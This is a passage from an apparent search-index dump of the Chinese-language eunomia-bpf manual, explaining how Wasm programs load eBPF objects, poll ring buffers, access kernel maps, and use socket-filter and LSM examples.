<p>\u5bf9\u4e8e\u590d\u6742\u7684\u7a0b\u5e8f\uff0c\u624b\u52a8\u786e\u8ba4\u5185\u5b58\u5e03\u5c40\u7684\u6b63\u786e\u662f\u5206\u56f0\u96be\uff0c\u56e0\u6b64\u6211\u4eec\u521b\u5efa\u4e86 wasm \u7279\u5b9a\u7684 <code>bpftool</code>\uff0c\u7528\u4e8e\u4ece <code>BTF</code> \u4fe1\u606f\u4e2d\u751f\u6210\u5305\u542b\u6240\u6709\u7c7b\u578b\u5b9a\u4e49\u548c\u6b63\u786e\u7ed3\u6784\u4f53\u5e03\u5c40\u7684 C \u5934\u6587\u4ef6\uff0c\u4ee5\u4fbf\u7528\u6237\u7a7a\u95f4\u4ee3\u7801\u4f7f\u7528\u3002\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u7684\u65b9\u6848\uff0c\u4e00\u6b21\u6027\u5c06 eBPF \u7a0b\u5e8f\u4e2d\u6240\u6709\u7684\u7ed3\u6784\u4f53\u5b9a\u4e49\u8f6c\u6362\u4e3a Wasm \u7aef\u7684\u5185\u5b58\u5e03\u5c40\uff0c\u5e76\u786e\u4fdd\u5927\u5c0f\u7aef\u4e00\u81f4\uff0c\u5373\u53ef\u6b63\u786e\u8bbf\u95ee\u3002</p> <p>\u5bf9\u4e8e Wasm \u4e2d\u4e0d\u662f\u7531 C \u8bed\u8a00\u8fdb\u884c\u5f00\u53d1\u7684\u60c5\u51b5\u4e0b\uff0c\u501f\u52a9 Wasm \u7684\u7ec4\u4ef6\u6a21\u578b\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5c06\u8fd9\u4e9b BTF \u4fe1\u606f\u7ed3\u6784\u4f53\u5b9a\u4e49\u4f5c\u4e3a wit \u7c7b\u578b\u58f0\u660e\u8f93\u51fa\uff0c\u7136\u540e\u5728\u7528\u6237\u7a7a\u95f4\u4ee3\u7801\u4e2d\u4f7f\u7528 wit-bindgen \u5de5\u5177\u4e00\u6b21\u6027\u751f\u6210\u591a\u79cd\u8bed\u8a00\uff08\u5982 C/C++/Rust/Go\uff09\u7684\u7c7b\u578b\u5b9a\u4e49\u3002\u8fd9\u90e8\u5206\u4f1a\u5728\u5173\u4e8e\u5982\u4f55\u4f7f\u7528 Rust \u5728 Wasm \u4e2d\u7f16\u5199 eBPF \u7a0b\u5e8f\u7684\u90e8\u5206\u8be6\u7ec6\u63cf\u8ff0\uff0c\u6211\u4eec\u4e5f\u4f1a\u5c06\u8fd9\u4e9b\u6b65\u9aa4\u548c\u5de5\u5177\u94fe\u7ee7\u7eed\u5b8c\u5584\uff0c\u4ee5\u6539\u8fdb Wasm-bpf \u7a0b\u5e8f\u7684\u7f16\u7a0b\u4f53\u9a8c\u3002</p> <p>\u6211\u4eec\u4e3a wasm \u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4ec5\u5305\u542b\u5934\u6587\u4ef6\u7684 libbpf API \u5e93\uff0c\u60a8\u53ef\u4ee5\u5728 libbpf-wasm.h\uff08wasm-include/libbpf-wasm.h\uff09\u4e2d\u627e\u5230\u5b83\uff0c\u5b83\u5305\u542b\u4e86\u4e00\u90e8\u5206 libbpf \u5e38\u7528\u7684\u7528\u6237\u6001 API \u548c\u7c7b\u578b\u5b9a\u4e49\u3002Wasm \u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528 libbpf API \u64cd\u4f5c BPF \u5bf9\u8c61\uff0c\u4f8b\u5982\uff1a</p> <pre><code>/* Load and verify BPF application */\nskel = bootstrap_bpf__open();\n/* Parameterize BPF code with minimum duration parameter */\nskel-&gt;rodata-&gt;min_duration_ns = env.min_duration_ms * 1000000ULL;\n/* Load &amp; verify BPF programs */\nerr = bootstrap_bpf__load(skel);\n/* Attach tracepoints */\nerr = bootstrap_bpf__attach(skel);\n</code></pre> <p>rodata \u90e8\u5206\u7528\u4e8e\u5b58\u50a8 BPF \u7a0b\u5e8f\u4e2d\u7684\u5e38\u91cf\uff0c\u8fd9\u4e9b\u503c\u5c06\u5728 bpftool gen skeleton \u7684\u65f6\u5019\u7531\u4ee3\u7801\u751f\u6210\u6620\u5c04\u5230 object \u4e2d\u6b63\u786e\u7684\u504f\u79fb\u91cf,\u7136\u540e\u5728 open \u4e4b\u540e\u901a\u8fc7\u5185\u5b58\u6620\u5c04\u4fee\u6539\u5bf9\u5e94\u7684\u503c\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u5728 Wasm \u4e2d\u7f16\u8bd1 libelf \u5e93\uff0c\u8fd0\u884c\u65f6\u4ecd\u53ef\u52a8\u6001\u52a0\u8f7d\u548c\u64cd\u4f5c BPF \u5bf9\u8c61\u3002</p> <p>Wasm \u7aef\u7684 C \u4ee3\u7801\u4e0e\u672c\u5730 libbpf \u4ee3\u7801\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u5b83\u53ef\u4ee5\u4ece eBPF \u7aef\u63d0\u4f9b\u5927\u90e8\u5206\u529f\u80fd\uff0c\u4f8b\u5982\uff0c\u4ece\u73af\u5f62\u7f13\u51b2\u533a\u6216 perf \u7f13\u51b2\u533a\u8f6e\u8be2\uff0c\u4ece Wasm \u7aef\u548c eBPF \u7aef\u8bbf\u95ee\u6620\u5c04\uff0c\u52a0\u8f7d\u3001\u9644\u52a0\u548c\u5206\u79bb BPF \u7a0b\u5e8f\u7b49\u3002\u5b83\u53ef\u4ee5\u652f\u6301\u5927\u91cf\u7684 eBPF \u7a0b\u5e8f\u7c7b\u578b\u548c\u6620\u5c04\uff0c\u6db5\u76d6\u4ece\u8ddf\u8e2a\u3001\u7f51\u7edc\u3001\u5b89\u5168\u7b49\u65b9\u9762\u7684\u5927\u591a\u6570 eBPF \u7a0b\u5e8f\u7684\u4f7f\u7528\u573a\u666f\u3002</p> <p>\u7531\u4e8e Wasm \u7aef\u7f3a\u5c11\u4e00\u4e9b\u529f\u80fd\uff0c\u4f8b\u5982 signal handler \u8fd8\u4e0d\u652f\u6301\uff082023\u5e742\u6708\uff09\uff0c\u539f\u59cb\u7684C\u4ee3\u7801\u6709\u53ef\u80fd\u65e0\u6cd5\u76f4\u63a5\u7f16\u8bd1\u4e3a wasm\uff0c\u60a8\u9700\u8981\u7a0d\u5fae\u4fee\u6539\u4ee3\u7801\u4ee5\u4f7f\u5176\u5de5\u4f5c\u3002\u6211\u4eec\u5c06\u5c3d\u6700\u5927\u52aa\u529b\u4f7f wasm \u7aef\u7684 libbpf API \u4e0e\u901a\u5e38\u5728\u7528\u6237\u7a7a\u95f4\u8fd0\u884c\u7684 libbpf API\u5c3d\u53ef\u80fd\u76f8\u4f3c\uff0c\u4ee5\u4fbf\u7528\u6237\u7a7a\u95f4\u4ee3\u7801\u53ef\u4ee5\u5728\u672a\u6765\u76f4\u63a5\u7f16\u8bd1\u4e3a wasm\u3002\u6211\u4eec\u8fd8\u5c06\u5c3d\u5feb\u63d0\u4f9b\u66f4\u591a\u8bed\u8a00\u7ed1\u5b9a\uff08Go\u7b49\uff09\u7684 wasm \u4fa7 eBPF \u7a0b\u5e8f\u5f00\u53d1\u5e93\u3002</p> <p>\u53ef\u4ee5\u5728\u7528\u6237\u6001\u7a0b\u5e8f\u4e2d\u4f7f\u7528 polling API \u83b7\u53d6\u5185\u6838\u6001\u4e0a\u4f20\u7684\u6570\u636e\u3002\u5b83\u5c06\u662f ring buffer \u548c perf buffer \u7684\u4e00\u4e2a\u5c01\u88c5\uff0c\u7528\u6237\u7a7a\u95f4\u4ee3\u7801\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684 API \u4ece\u73af\u5f62\u7f13\u51b2\u533a\u6216\u6027\u80fd\u7f13\u51b2\u533a\u4e2d\u8f6e\u8be2\u4e8b\u4ef6\uff0c\u5177\u4f53\u53d6\u51b3\u4e8eBPF\u7a0b\u5e8f\u4e2d\u6307\u5b9a\u7684\u7c7b\u578b\u3002\u4f8b\u5982\uff0c\u73af\u5f62\u7f13\u51b2\u533a\u8f6e\u8be2\u5b9a\u4e49\u4e3a<code>BPF_MAP_TYPE_RINGBUF</code>\uff1a</p> <pre><code>struct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n</code></pre> <p>\u4f60\u53ef\u4ee5\u5728\u7528\u6237\u6001\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u4ece ring buffer \u4e2d\u8f6e\u8be2\u4e8b\u4ef6\uff1a</p> <pre><code>rb = bpf_buffer__open(skel-&gt;maps.rb, handle_event, NULL);\n/* Process events */\nprintf(\"%-8s %-5s %-16s %-7s %-7s %s\\n\", \"TIME\", \"EVENT\", \"COMM\", \"PID\",\n       \"PPID\", \"FILENAME/EXIT CODE\");\nwhile (!exiting) {\n    // poll buffer\n    err = bpf_buffer__poll(rb, 100 /* timeout, ms */);\n</code></pre> <p>ring buffer polling \u4e0d\u9700\u8981\u5e8f\u5217\u5316\u5f00\u9500\u3002bpf_buffer__poll API \u5c06\u8c03\u7528 handle_event \u56de\u8c03\u51fd\u6570\u6765\u5904\u7406\u73af\u5f62\u7f13\u51b2\u533a\u4e2d\u7684\u4e8b\u4ef6\u6570\u636e\uff1a</p> <pre><code>static int\nhandle_event(void *ctx, void *data, size_t data_sz)\n{\n    const struct event *e = data;\n    ...\n    if (e-&gt;exit_event) {\n        printf(\"%-8s %-5s %-16s %-7d %-7d [%u]\", ts, \"EXIT\", e-&gt;comm, e-&gt;pid,\n               e-&gt;ppid, e-&gt;exit_code);\n        if (e-&gt;duration_ns)\n            printf(\" (%llums)\", e-&gt;duration_ns / 1000000);\n        printf(\"\\n\");\n    }\n    ...\n    return 0;\n}\n</code></pre> <p>\u8fd0\u884c\u65f6\u57fa\u4e8e libbpf CO-RE\uff08Compile Once, Run Everywhere\uff09API\uff0c\u7528\u4e8e\u5c06 bpf \u5bf9\u8c61\u52a0\u8f7d\u5230\u5185\u6838\u4e2d\uff0c\u56e0\u6b64 wasm-bpf \u7a0b\u5e8f\u4e0d\u53d7\u5b83\u7f16\u8bd1\u7684\u5185\u6838\u7248\u672c\u7684\u5f71\u54cd\uff0c\u53ef\u4ee5\u5728\u4efb\u4f55\u652f\u6301 BPF CO-RE \u7684\u5185\u6838\u7248\u672c\u4e0a\u8fd0\u884c\u3002</p>"},{"location":"eunomia-bpf/manual/#ebpf-map","title":"\u4ece\u7528\u6237\u6001\u7a0b\u5e8f\u4e2d\u8bbf\u95ee\u548c\u66f4\u65b0 eBPF \u7a0b\u5e8f\u7684 map \u6570\u636e","text":"<p>runqlat \u662f\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u793a\u4f8b\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u901a\u8fc7\u76f4\u65b9\u56fe\u5c55\u793a\u8c03\u5ea6\u5668\u8fd0\u884c\u961f\u5217\u5ef6\u8fdf\uff0c\u7ed9\u6211\u4eec\u5c55\u73b0\u4e86\u4efb\u52a1\u7b49\u4e86\u591a\u4e45\u624d\u80fd\u8fd0\u884c\u3002</p> <pre><code>$ sudo ./wasm-bpf runqlat.wasm -h\nSummarize run queue (scheduler) latency as a histogram.\n\nUSAGE: runqlat [--help] [interval] [count]\n\nEXAMPLES:\n    runqlat         # summarize run queue latency as a histogram\n    runqlat 1 10    # print 1 second summaries, 10 times\n$ sudo ./wasm-bpf runqlat.wasm 1\n\nTracing run queue latency... Hit Ctrl-C to end.\n\n     usecs               : count    distribution\n         0 -&gt; 1          : 72       |*****************************           |\n         2 -&gt; 3          : 93       |*************************************   |\n         4 -&gt; 7          : 98       |****************************************|\n         8 -&gt; 15         : 96       |*************************************** |\n        16 -&gt; 31         : 38       |***************                         |\n        32 -&gt; 63         : 4        |*                                       |\n        64 -&gt; 127        : 5        |**                                      |\n       128 -&gt; 255        : 6        |**                                      |\n       256 -&gt; 511        : 0        |                                        |\n       512 -&gt; 1023       : 0        |                                        |\n      1024 -&gt; 2047       : 0        |                                        |\n      2048 -&gt; 4095       : 1        |                                        |\n</code></pre> <p>runqlat \u4e2d\u4f7f\u7528 <code>map</code> API \u6765\u4ece\u7528\u6237\u6001\u8bbf\u95ee\u5185\u6838\u91cc\u7684 <code>map</code> \u5e76\u76f4\u63a5\u8bfb\u53d6\u6570\u636e\uff0c\u4f8b\u5982\uff1a</p> <pre><code>    while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n        err = bpf_map_lookup_elem(fd, &amp;next_key, &amp;hist);\n        ...\n        lookup_key = next_key;\n    }\n    lookup_key = -2;\n    while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n        err = bpf_map_delete_elem(fd, &amp;next_key);\n        ...\n        lookup_key = next_key;\n    }\n</code></pre> <p>\u8fd0\u884c\u65f6 wasm \u4ee3\u7801\u5c06\u4f1a\u4f7f\u7528\u5171\u4eab\u5185\u5b58\u6765\u8bbf\u95ee\u5185\u6838 map\uff0c\u5185\u6838\u6001\u53ef\u4ee5\u76f4\u63a5\u628a\u6570\u636e\u62f7\u8d1d\u5230\u7528\u6237\u6001 Wasm \u865a\u62df\u673a\u7684\u5806\u6808\u4e2d\uff0c\u800c\u4e0d\u9700\u8981\u9762\u5bf9\u7528\u6237\u6001\u4e3b\u673a\u4fa7\u7a0b\u5e8f\u548c Wasm \u8fd0\u884c\u65f6\u4e4b\u95f4\u7684\u989d\u5916\u62f7\u8d1d\u5f00\u9500\u3002\u540c\u6837\uff0c\u5bf9\u4e8e Wasm \u865a\u62df\u673a\u548c\u5185\u6838\u6001\u4e4b\u95f4\u5171\u4eab\u7684\u7c7b\u578b\u5b9a\u4e49\uff0c\u9700\u8981\u7ecf\u8fc7\u4ed4\u7ec6\u68c0\u67e5\u4ee5\u786e\u4fdd\u5b83\u4eec\u5728 Wasm \u548c\u5185\u6838\u6001\u4e2d\u7684\u7c7b\u578b\u662f\u4e00\u81f4\u7684\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528 <code>bpf_map_update_elem</code> \u5728\u7528\u6237\u6001\u7a0b\u5e8f\u5185\u66f4\u65b0\u5185\u6838\u7684 eBPF map\uff0c\u6bd4\u5982:</p> <pre><code>        cg_map_fd = bpf_map__fd(obj-&gt;maps.cgroup_map);\n        cgfd = open(env.cgroupspath, O_RDONLY);\n        if (cgfd &lt; 0) {\n            ...\n        }\n        if (bpf_map_update_elem(cg_map_fd, &amp;idx, &amp;cgfd, BPF_ANY)) {\n            ...\n        }\n</code></pre> <p>\u56e0\u6b64\u5185\u6838\u7684 eBPF \u7a0b\u5e8f\u53ef\u4ee5\u4ece Wasm \u4fa7\u7684\u7a0b\u5e8f\u83b7\u53d6\u914d\u7f6e\uff0c\u6216\u8005\u5728\u8fd0\u884c\u7684\u65f6\u5019\u63a5\u6536\u6d88\u606f\u3002</p>"},{"location":"eunomia-bpf/manual/#ebpf-map_1","title":"\u4ece\u7528\u6237\u6001\u7a0b\u5e8f\u4e2d\u8bbf\u95ee\u548c\u66f4\u65b0 eBPF \u7a0b\u5e8f\u7684 map \u6570\u636e","text":"<p>runqlat \u662f\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u793a\u4f8b\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u901a\u8fc7\u76f4\u65b9\u56fe\u5c55\u793a\u8c03\u5ea6\u5668\u8fd0\u884c\u961f\u5217\u5ef6\u8fdf\uff0c\u7ed9\u6211\u4eec\u5c55\u73b0\u4e86\u4efb\u52a1\u7b49\u4e86\u591a\u4e45\u624d\u80fd\u8fd0\u884c\u3002</p> <pre><code>$ sudo ./wasm-bpf runqlat.wasm -h\nSummarize run queue (scheduler) latency as a histogram.\n\nUSAGE: runqlat [--help] [interval] [count]\n\nEXAMPLES:\n    runqlat         # summarize run queue latency as a histogram\n    runqlat 1 10    # print 1 second summaries, 10 times\n$ sudo ./wasm-bpf runqlat.wasm 1\n\nTracing run queue latency... Hit Ctrl-C to end.\n\n     usecs               : count    distribution\n         0 -&gt; 1          : 72       |*****************************           |\n         2 -&gt; 3          : 93       |*************************************   |\n         4 -&gt; 7          : 98       |****************************************|\n         8 -&gt; 15         : 96       |*************************************** |\n        16 -&gt; 31         : 38       |***************                         |\n        32 -&gt; 63         : 4        |*                                       |\n        64 -&gt; 127        : 5        |**                                      |\n       128 -&gt; 255        : 6        |**                                      |\n       256 -&gt; 511        : 0        |                                        |\n       512 -&gt; 1023       : 0        |                                        |\n      1024 -&gt; 2047       : 0        |                                        |\n      2048 -&gt; 4095       : 1        |                                        |\n</code></pre> <p>runqlat \u4e2d\u4f7f\u7528 <code>map</code> API \u6765\u4ece\u7528\u6237\u6001\u8bbf\u95ee\u5185\u6838\u91cc\u7684 <code>map</code> \u5e76\u76f4\u63a5\u8bfb\u53d6\u6570\u636e\uff0c\u4f8b\u5982\uff1a</p> <pre><code>    while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n        err = bpf_map_lookup_elem(fd, &amp;next_key, &amp;hist);\n        ...\n        lookup_key = next_key;\n    }\n    lookup_key = -2;\n    while (!bpf_map_get_next_key(fd, &amp;lookup_key, &amp;next_key)) {\n        err = bpf_map_delete_elem(fd, &amp;next_key);\n        ...\n        lookup_key = next_key;\n    }\n</code></pre> <p>\u8fd0\u884c\u65f6 wasm \u4ee3\u7801\u5c06\u4f1a\u4f7f\u7528\u5171\u4eab\u5185\u5b58\u6765\u8bbf\u95ee\u5185\u6838 map\uff0c\u5185\u6838\u6001\u53ef\u4ee5\u76f4\u63a5\u628a\u6570\u636e\u62f7\u8d1d\u5230\u7528\u6237\u6001 Wasm \u865a\u62df\u673a\u7684\u5806\u6808\u4e2d\uff0c\u800c\u4e0d\u9700\u8981\u9762\u5bf9\u7528\u6237\u6001\u4e3b\u673a\u4fa7\u7a0b\u5e8f\u548c Wasm \u8fd0\u884c\u65f6\u4e4b\u95f4\u7684\u989d\u5916\u62f7\u8d1d\u5f00\u9500\u3002\u540c\u6837\uff0c\u5bf9\u4e8e Wasm \u865a\u62df\u673a\u548c\u5185\u6838\u6001\u4e4b\u95f4\u5171\u4eab\u7684\u7c7b\u578b\u5b9a\u4e49\uff0c\u9700\u8981\u7ecf\u8fc7\u4ed4\u7ec6\u68c0\u67e5\u4ee5\u786e\u4fdd\u5b83\u4eec\u5728 Wasm \u548c\u5185\u6838\u6001\u4e2d\u7684\u7c7b\u578b\u662f\u4e00\u81f4\u7684\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528 <code>bpf_map_update_elem</code> \u5728\u7528\u6237\u6001\u7a0b\u5e8f\u5185\u66f4\u65b0\u5185\u6838\u7684 eBPF map\uff0c\u6bd4\u5982:</p> <pre><code>        cg_map_fd = bpf_map__fd(obj-&gt;maps.cgroup_map);\n        cgfd = open(env.cgroupspath, O_RDONLY);\n        if (cgfd &lt; 0) {\n            ...\n        }\n        if (bpf_map_update_elem(cg_map_fd, &amp;idx, &amp;cgfd, BPF_ANY)) {\n            ...\n        }\n</code></pre> <p>\u56e0\u6b64\u5185\u6838\u7684 eBPF \u7a0b\u5e8f\u53ef\u4ee5\u4ece Wasm \u4fa7\u7684\u7a0b\u5e8f\u83b7\u53d6\u914d\u7f6e\uff0c\u6216\u8005\u5728\u8fd0\u884c\u7684\u65f6\u5019\u63a5\u6536\u6d88\u606f\u3002</p>"},{"location":"eunomia-bpf/manual/#socket-filter-lsm","title":"\u66f4\u591a\u7684\u4f8b\u5b50\uff1asocket filter \u548c lsm","text":"<p>\u5728\u4ed3\u5e93\u4e2d\uff0c\u6211\u4eec\u8fd8\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u793a\u4f8b\uff0c\u4f8b\u5982\u4f7f\u7528 socket filter \u76d1\u63a7\u548c\u8fc7\u6ee4\u6570\u636e\u5305\uff1a</p> <pre><code>SEC(\"socket\")\nint socket_handler(struct __sk_buff *skb)\n{\n    struct so_event *e;\n    __u8 verlen;\n    __u16 proto;\n    __u32 nhoff = ETH_HLEN;\n\n    bpf_skb_load_bytes(skb, 12, &amp;proto, 2);\n    ...\n\n    bpf_skb_load_bytes(skb, nhoff + 0, &amp;verlen, 1);\n    bpf_skb_load_bytes(skb, nhoff + ((verlen &amp; 0xF) &lt;&lt; 2), &amp;(e-&gt;ports), 4);\n    e-&gt;pkt_type = skb-&gt;pkt_type;\n    e-&gt;ifindex = skb-&gt;ifindex;\n    bpf_ringbuf_submit(e, 0);\n\n    return skb-&gt;len;\n}\n</code></pre> <p>Linux Security Modules\uff08LSM\uff09\u662f\u4e00\u4e2a\u57fa\u4e8e\u94a9\u5b50\u7684\u6846\u67b6\uff0c\u7528\u4e8e\u5728Linux\u5185\u6838\u4e2d\u5b9e\u73b0\u5b89\u5168\u7b56\u7565\u548c\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\u3002\u76f4\u5230\u73b0\u5728\uff0c\u80fd\u591f\u5b9e\u73b0\u5b9e\u65bd\u5b89\u5168\u7b56\u7565\u76ee\u6807\u7684\u65b9\u5f0f\u53ea\u6709\u4e24\u79cd\u9009\u62e9\uff0c\u914d\u7f6e\u73b0\u6709\u7684LSM\u6a21\u5757\uff08\u5982AppArmor\u3001SELinux\uff09\uff0c\u6216\u7f16\u5199\u81ea\u5b9a\u4e49\u5185\u6838\u6a21\u5757\u3002</p> <p>Linux Kernel 5.7 \u5f15\u5165\u4e86\u7b2c\u4e09\u79cd\u65b9\u5f0f\uff1aLSM eBPF\u3002LSM BPF \u5141\u8bb8\u5f00\u53d1\u4eba\u5458\u7f16\u5199\u81ea\u5b9a\u4e49\u7b56\u7565\uff0c\u800c\u65e0\u9700\u914d\u7f6e\u6216\u52a0\u8f7d\u5185\u6838\u6a21\u5757\u3002LSM BPF \u7a0b\u5e8f\u5728\u52a0\u8f7d\u65f6\u88ab\u9a8c\u8bc1\uff0c\u7136\u540e\u5728\u8c03\u7528\u8def\u5f84\u4e2d\uff0c\u5230\u8fbeLSM\u94a9\u5b50\u65f6\u88ab\u6267\u884c\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 Wasm \u8f7b\u91cf\u7ea7\u5bb9\u5668\u4e2d\uff0c\u4f7f\u7528 lsm \u9650\u5236\u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c\uff1a</p> <pre><code>// all lsm the hook point refer https://www.kernel.org/doc/html/v5.2/security/LSM.html\nSEC(\"lsm/path_rmdir\")\nint path_rmdir(const struct path *dir, struct dentry *dentry) {\n  char comm[16];\n  bpf_get_current_comm(comm, sizeof(comm));\n  unsigned char dir_name[] = \"can_not_rm\";\n  unsigned char d_iname[32];\n  bpf_probe_read_kernel(&amp;d_iname[0], sizeof(d_iname),\n                        &amp;(dir-&gt;dentry-&gt;d_iname[0]));\n\n  bpf_printk(\"comm %s try to rmdir %s\", comm, d_iname);\n  for (int i = 0;i&lt;sizeof(dir_name);i++){\n    if (d_iname[i]!=dir_name[i]){\n        return 0;\n    }\n  }\n  return -1;\n}\n</code></pre>"},{"location":"eunomia-bpf/manual/#_1","title":"\u6f14\u793a\u89c6\u9891","text":"<p>\u6211\u4eec\u4e5f\u6709\u4e00\u4e2a\u5728 B \u7ad9\u4e0a\u7684\u6f14\u793a\u89c6\u9891\uff0c\u6f14\u793a\u4e86\u5982\u4f55\u4ece bcc/libbpf-tools \u4e2d\u79fb\u690d\u4e00\u4e2a eBPF \u5de5\u5177\u7a0b\u5e8f\u5230 eunomia-bpf \u4e2d\uff0c\u5e76\u4e14\u4f7f\u7528 Wasm \u6216 JSON \u6587\u4ef6\u6765\u5206\u53d1\u3001\u52a0\u8f7d eBPF \u7a0b\u5e8f\uff1ahttps://www.bilibili.com/video/BV1JN4y1A76k</p> <p><code>ecli</code> \u662f\u57fa\u4e8e\u6211\u4eec\u5e95\u5c42\u7684 eunomia-bpf \u5e93\u548c\u8fd0\u884c\u65f6\u5b9e\u73b0\u7684\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002\u6211\u4eec\u7684\u9879\u76ee\u67b6\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p><code>ecli</code> \u5de5\u5177\u57fa\u4e8e <code>ewasm</code> \u5e93\u5b9e\u73b0\uff0c<code>ewasm</code> \u5e93\u5305\u542b\u4e00\u4e2a WAMR(wasm-micro-runtime) \u8fd0\u884c\u65f6\uff0c\u4ee5\u53ca\u57fa\u4e8e libbpf \u5e93\u6784\u5efa\u7684 eBPF \u52a8\u6001\u88c5\u8f7d\u6a21\u5757\u3002\u5927\u81f4\u6765\u8bf4\uff0c\u6211\u4eec\u5728 <code>Wasm</code> \u8fd0\u884c\u65f6\u548c\u7528\u6237\u6001\u7684 <code>libbpf</code> \u4e2d\u95f4\u591a\u52a0\u4e86\u4e00\u5c42\u62bd\u8c61\u5c42\uff08<code>eunomia-bpf</code> \u5e93\uff09\uff0c\u4f7f\u5f97\u4e00\u6b21\u7f16\u8bd1\u3001\u5230\u5904\u8fd0\u884c\u7684 eBPF \u4ee3\u7801\u53ef\u4ee5\u4ece JSON \u5bf9\u8c61\u4e2d\u52a8\u6001\u52a0\u8f7d\u3002JSON \u5bf9\u8c61\u4f1a\u5728\u7f16\u8bd1\u65f6\u88ab\u5305\u542b\u5728 Wasm \u6a21\u5757\u4e2d\uff0c\u56e0\u6b64\u5728\u8fd0\u884c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u89e3\u6790 JSON \u5bf9\u8c61\u6765\u83b7\u53d6 eBPF \u7a0b\u5e8f\u7684\u4fe1\u606f\uff0c\u7136\u540e\u52a8\u6001\u52a0\u8f7d eBPF \u7a0b\u5e8f\u3002</p> <p>\u4f7f\u7528 Wasm \u6216 JSON \u7f16\u8bd1\u5206\u53d1 eBPF \u7a0b\u5e8f\u7684\u6d41\u7a0b\u56fe\u5927\u81f4\u5982\u4e0b\uff1a</p> <p></p> <p>\u5927\u81f4\u6765\u8bf4\uff0c\u6574\u4e2a eBPF \u7a0b\u5e8f\u7684\u7f16\u5199\u548c\u52a0\u8f7d\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206\uff1a</p> <ol> <li>\u7528 eunomia-cc \u5de5\u5177\u94fe\u5c06\u5185\u6838\u7684 eBPF \u4ee3\u7801\u9aa8\u67b6\u548c\u5b57\u8282\u7801\u7f16\u8bd1\u4e3a JSON \u683c\u5f0f</li> <li>\u5728\u7528\u6237\u6001\u5f00\u53d1\u7684\u9ad8\u7ea7\u8bed\u8a00\uff08\u4f8b\u5982 C \u8bed\u8a00\uff09\u4e2d\u5d4c\u5165 JSON \u6570\u636e\uff0c\u5e76\u63d0\u4f9b\u4e00\u4e9b API \u7528\u4e8e\u64cd\u4f5c JSON \u5f62\u6001\u7684 eBPF \u7a0b\u5e8f\u9aa8\u67b6</li> <li>\u5c06\u7528\u6237\u6001\u7a0b\u5e8f\u548c JSON \u6570\u636e\u4e00\u8d77\u7f16\u8bd1\u4e3a Wasm \u5b57\u8282\u7801\u5e76\u6253\u5305\u4e3a Wasm \u6a21\u5757\uff0c\u7136\u540e\u5728\u76ee\u6807\u673a\u5668\u4e0a\u52a0\u8f7d\u5e76\u8fd0\u884c Wasm \u7a0b\u5e8f</li> <li>\u4ece Wasm \u6a21\u5757\u4e2d\u52a0\u8f7d\u5185\u5d4c\u7684 JSON \u6570\u636e\uff0c\u7528 eunomia-bpf \u5e93\u52a8\u6001\u88c5\u8f7d\u548c\u914d\u7f6e eBPF \u7a0b\u5e8f\u9aa8\u67b6\u3002</li> </ol> <p>\u6211\u4eec\u9700\u8981\u5b8c\u6210\u7684\u4ec5\u4ec5\u662f\u5c11\u91cf\u7684 native API \u548c Wasm \u8fd0\u884c\u65f6\u7684\u7ed1\u5b9a\uff0c\u5e76\u4e14\u5728 Wasm \u4ee3\u7801\u4e2d\u5904\u7406 JSON \u6570\u636e\u3002\u4f60\u53ef\u4ee5\u5728\u4e00\u4e2a\u5355\u4e00\u7684 <code>Wasm</code> \u6a21\u5757\u4e2d\u62e5\u6709\u591a\u4e2a <code>eBPF</code> \u7a0b\u5e8f\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u6211\u4eec\u63d0\u4f9b\u7684 Wasm \u8fd0\u884c\u65f6\uff0c\u6216\u8005\u60f3\u8981\u4f7f\u7528\u5176\u4ed6\u8bed\u8a00\u8fdb\u884c\u7528\u6237\u6001\u7684 eBPF \u8f85\u52a9\u4ee3\u7801\u7684\u5f00\u53d1\uff0c\u5728\u6211\u4eec\u63d0\u4f9b\u7684 <code>eunomia-bpf</code> \u5e93\u57fa\u7840\u4e0a\u5b8c\u6210\u4e00\u4e9b WebaAssembly \u7684\u7ed1\u5b9a\u5373\u53ef\u3002</p> <p>\u53e6\u5916\uff0c\u5bf9\u4e8e eunomia-bpf \u5e93\u800c\u8a00\uff0c\u4e0d\u9700\u8981 Wasm \u6a21\u5757\u548c\u8fd0\u884c\u65f6\u540c\u6837\u53ef\u4ee5\u542f\u52a8\u548c\u52a8\u6001\u52a0\u8f7d eBPF \u7a0b\u5e8f\uff0c\u4e0d\u8fc7\u6b64\u65f6\u52a8\u6001\u52a0\u8f7d\u8fd0\u884c\u7684\u5c31\u53ea\u662f\u5185\u6838\u6001\u7684 eBPF \u7a0b\u5e8f\u5b57\u8282\u7801\u3002\u4f60\u53ef\u4ee5\u624b\u52a8\u6216\u4f7f\u7528\u4efb\u610f\u8bed\u8a00\u4fee\u6539 JSON \u5bf9\u8c61\u6765\u63a7\u5236 eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u53c2\u6570\uff0c\u5e76\u4e14\u901a\u8fc7 eunomia-bpf 